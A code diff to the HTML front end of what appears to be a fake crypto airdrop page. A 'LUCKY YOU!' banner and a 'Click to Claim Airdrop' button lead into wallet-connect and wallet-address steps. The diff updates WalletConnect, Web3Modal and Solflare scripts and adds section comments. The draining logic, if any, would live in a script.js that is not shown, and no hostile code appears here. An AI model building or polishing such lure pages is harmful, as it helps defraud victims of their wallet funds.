@@ -7,17 +7,23 @@
 
 <link rel="stylesheet" href="style.css">
 
+<!-- Solana & EVM SDKs -->
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
 
-<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-<script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
+<!-- WalletConnect v2 / Web3Modal v2 -->
+<script src="https://unpkg.com/@walletconnect/ethereum-provider/dist/index.umd.js"></script>
+<script src="https://unpkg.com/@web3modal/ethereum/dist/index.umd.js"></script>
+<script src="https://unpkg.com/@web3modal/html/dist/index.umd.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+<!-- Solflare v2 SDK -->
 <script src="https://unpkg.com/@solflare-wallet/sdk/lib/index.iife.js"></script>
 </head>
 
 <body>
 
+<!-- Landing Section -->
 <div class="container" id="landingSection">
   <div class="logo-circle">VTXT</div>
   <h1>LUCKY YOU!</h1>
@@ -25,16 +31,19 @@
   <button id="proceedBtn">Click to Claim Airdrop</button>
 </div>
 
+<!-- Connect Wallet Section -->
 <div class="container hidden" id="connectSection">
   <button id="connectBtn">Connect Wallet</button>
 </div>
 
+<!-- Solana Wallet Input Section -->
 <div class="container hidden" id="solanaSection">
   <input type="text" id="solAddress" placeholder="Wallet Address" />
   <div class="progress"><span></span></div>
   <button id="submitSol" class="hidden">Submit</button>
 </div>
 
+<!-- Terms Modal -->
 <div class="modal hidden" id="termsModal">
   <div class="modal-card">
     <h2>Terms & Conditions</h2>
@@ -43,6 +52,7 @@
   </div>
 </div>
 
+<!-- Airdrop Page -->
 <section id="airdropPage" class="hidden">
   <h2>VTXT Wallet</h2>
   <p id="userWallet">—</p>
@@ -52,6 +62,7 @@
   </div>
 </section>
 
+<!-- Wallet Choice Modal -->
 <div class="modal hidden" id="walletChoiceModal">
   <div class="modal-card">
     <h2>Select Wallet</h2>
@@ -62,6 +73,7 @@
   </div>
 </div>
 
+<!-- JS Script -->
 <script src="script.js"></script>
 </body>
   </html>
